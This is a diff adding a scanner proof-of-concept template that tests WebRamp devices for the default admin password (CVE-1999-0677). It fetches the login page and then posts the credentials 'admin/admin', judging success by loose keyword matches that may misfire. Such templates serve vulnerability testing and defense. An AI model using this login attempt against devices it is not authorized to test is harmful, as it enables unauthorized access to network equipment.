@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "检测 WebRamp 设备 Web 管理接口是否存在默认口令漏洞。尝试访问管理页面并使用默认凭据登录，若成功则表明设备存在风险。"
+id = "POC-AVE-1999-0224"
+name = "WebRamp Default Admin Password PoC"
+severity = "high"
+tags = ["ave-1999-0224"]
+vuln_id = [
+    "CVE-1999-0677",
+    "AVE-1999-0224",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "WebRamp",
+    "Administration",
+    "Login",
+    "password",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=admin&pass=admin"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "Welcome",
+    "admin",
+    "status",
+]
